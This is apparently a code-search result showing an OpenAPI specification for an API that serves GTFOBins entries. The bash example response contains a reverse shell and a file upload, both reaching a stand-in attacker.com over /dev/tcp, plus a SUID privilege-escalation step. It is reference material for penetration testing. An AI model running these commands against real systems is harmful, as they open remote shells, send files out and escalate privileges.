{
	"File": {
		"__typename": "FileMatch",
		"repository": {
			"name": "github.com/R3tr074/gtfobins-api"
		},
		"file": {
			"name": "doc.json",
			"path": "src/pages/docs/doc.json",
			"content": "{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"Gtfobin API\",\n    \"description\": \"Get Gtfobin infos Through the API, simple and rapid\",\n    \"version\": \"1.0.0\",\n    \"contact\": {\n      \"url\": \"https://brasilapi.com.br\"\n    },\n    \"license\": {\n      \"name\": \"MIT\",\n      \"url\": \"https://github.com/R3tr074/gtfobins-api/blob/main/LICENSE\"\n    }\n  },\n  \"servers\": [\n    {\n      \"url\": \"https://gtfobins.tk/api\"\n    }\n  ],\n  \"paths\": {\n    \"/search\": {\n      \"get\": {\n        \"tags\": [\"Search\"],\n        \"summary\": \"Find your binary by name\",\n        \"description\": \"\",\n        \"parameters\": [\n          {\n            \"name\": \"binaryName\",\n            \"description\": \"Name of the binary to be searched.\\n\",\n            \"in\": \"query\",\n            \"required\": true,\n            \"schema\": { \"type\": \"string\" }\n          }\n        ],\n        \"responses\": {\n          \"200\": {\n            \"description\": \"Success\",\n            \"content\": {\n              \"application/json\": {\n                \"example\": {\n                  \"binaryName\": \"bash\",\n                  \"url\": \"https://gtfobins.tk/api/binary/bash/\",\n                  \"functions\": [\n                    \"Shell\",\n                    \"Reverse shell\",\n                    \"File upload\",\n                    \"File download\",\n                    \"File write\",\n                    \"File read\",\n                    \"Library load\",\n                    \"SUID\",\n                    \"Sudo\"\n                  ]\n                }\n              }\n            }\n          },\n          \"404\": {\n            \"description\": \"Binary not found.\",\n            \"content\": {\n              \"application/json\": {\n                \"example\": { \"error\": \"notFound\" }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"/binary/{binary}\": {\n      \"get\": {\n        \"tags\": [\"Binary\"],\n        \"summary\": \"Return all functions to binary\",\n        \"description\": \"\",\n        \"parameters\": [\n          {\n            \"name\": \"binary\",\n            \"description\": \"Binary name.\\n\",\n            \"in\": \"path\",\n            \"required\": true,\n            \"schema\": { \"type\": \"string\" }\n          }\n        ],\n        \"responses\": {\n          \"200\": {\n            \"description\": \"Success\",\n            \"content\": {\n              \"application/json\": {\n                \"example\": [\n                  { \"code\": \"bash\", \"func\": \"Shell\" },\n                  {\n                    \"code\": \"export RHOST=attacker.com\\nexport RPORT=12345\\nbash -c 'exec bash -i \u0026amp;\u0026gt;/dev/tcp/$RHOST/$RPORT \u0026lt;\u0026amp;1'\",\n                    \"func\": \"Reverse shell\"\n                  },\n                  {\n                    \"code\": \"export RHOST=attacker.com\\nexport RPORT=12345\\nexport LFILE=file_to_send\\nbash -c 'echo -e \\\"POST / HTTP/0.9\\\\n\\\\n$(\u0026lt;$LFILE)\\\" \u0026gt; /dev/tcp/$RHOST/$RPORT'\",\n                    \"func\": \"File upload\"\n                  },\n                  {\n                    \"code\": \"export RHOST=attacker.com\\nexport RPORT=12345\\nexport LFILE=file_to_get\\nbash -c '{ echo -ne \\\"GET /$LFILE HTTP/1.0\\\\r\\\\nhost: $RHOST\\\\r\\\\n\\\\r\\\\n\\\" 1\u0026gt;\u0026amp;3; cat 0\u0026lt;\u0026amp;3; } \\\\\\n    3\u0026lt;\u0026gt;/dev/tcp/$RHOST/$RPORT \\\\\\n    | { while read -r; do [ \\\"$REPLY\\\" = \\\"$(echo -ne \\\"\\\\r\\\")\\\" ] \u0026amp;\u0026amp; break; done; cat; } \u0026gt; $LFILE'\",\n                    \"func\": \"File download\"\n                  },\n                  {\n                    \"code\": \"export LFILE=file_to_write\\nbash -c 'echo DATA \u0026gt; $LFILE'\",\n                    \"func\": \"File write\"\n                  },\n                  {\n                    \"code\": \"export LFILE=file_to_read\\nbash -c 'echo \\\"$(\u0026lt;$LFILE)\\\"'\",\n                    \"func\": \"File read\"\n                  },\n                  {\n                    \"code\": \"bash -c 'enable -f ./lib.so x'\",\n                    \"func\": \"Library load\"\n                  },\n                  {\n                    \"code\": \"sudo install -m =xs $(which bash) .\\n\\n./bash -p\",\n                    \"func\": \"SUID\"\n                  },\n                  { \"code\": \"sudo bash\", \"func\": \"Sudo\" }\n                ]\n              }\n            }\n          },\n          \"404\": {\n            \"description\": \"Binary not found\",\n            \"content\": {\n              \"application/json\": {\n                \"example\": { \"error\": \"notFound\" }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"
		}
	},
	"Error": "panic: runtime error: index out of range [0] with length 0"
}